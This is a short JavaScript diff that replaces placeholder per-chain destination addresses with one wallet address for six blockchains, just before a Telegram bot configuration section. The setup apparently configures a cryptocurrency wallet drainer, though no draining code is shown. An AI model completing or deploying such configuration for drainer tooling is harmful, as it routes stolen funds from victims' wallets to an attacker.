@@ -34,12 +34,12 @@ const supportedChains = [1, 56, 10, 324, 42161, 137];
 
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
-  1: '0x...MainnetAddress',
-  56: '0x...BSCAddress',
-  10: '0x...OptimismAddress',
-  324: '0x...ZkSyncAddress',
-  42161: '0x...ArbitrumAddress',
-  137: '0x...PolygonAddress',
+  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
 // Telegram bot configuration
